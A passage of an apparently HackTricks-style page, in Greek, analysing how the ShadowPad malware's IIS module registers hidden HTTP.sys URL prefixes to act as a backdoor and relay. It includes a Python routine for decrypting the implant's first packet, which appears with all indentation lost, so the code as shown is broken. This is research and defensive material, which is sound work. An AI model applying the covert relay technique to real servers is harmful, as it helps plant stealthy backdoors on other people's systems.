## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Το IIS module του Ink Dragon’s ShadowPad μετατρέπει κάθε συμβιβασμένο perimeter web server σε διπλής χρήσης **backdoor + relay** δεσμεύοντας κρυφά URL prefixes απευθείας στο layer του HTTP.sys:

* **Config defaults** – αν το JSON config του module παραλείπει τιμές, πέφτει σε πιστευτά IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Με αυτόν τον τρόπο η benign κίνηση απαντάται από το IIS με το σωστό branding.  
* **Wildcard interception** – οι operators παρέχουν μια λίστα με URL prefixes χωρισμένα με ερωτηματικό (;), wildcards σε host + path. Το module καλεί `HttpAddUrl` για κάθε εγγραφή, έτσι το HTTP.sys δρομολογεί matching requests στον malicious handler πριν το request φτάσει στα IIS modules.  
* **Encrypted first packet** – τα πρώτα δύο bytes του request body φέρουν τον seed για έναν custom 32-bit PRNG. Κάθε επόμενο byte γίνεται XOR με το παραγόμενο keystream πριν το protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – το module διατηρεί δύο λίστες: “servers” (upstream nodes) και “clients” (downstream implants). Εγγραφές κόβονται αν δεν ληφθεί heartbeat μέσα σε ~30 δευτερόλεπτα. Όταν και οι δύο λίστες δεν είναι κενές, ζευγαρώνει τον πρώτο healthy server με τον πρώτο healthy client και απλώς προωθεί bytes ανάμεσα στις sockets μέχρι να κλείσει κάποια πλευρά.  
* **Debug telemetry** – προαιρετικό logging καταγράφει source IP, destination IP, και συνολικά forwarded bytes για κάθε ζεύξη. Οι ερευνητές χρησιμοποίησαν αυτά τα breadcrumbs για να ανασυνθέσουν το ShadowPad mesh που εκτεινόταν σε πολλαπλά θύματα.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
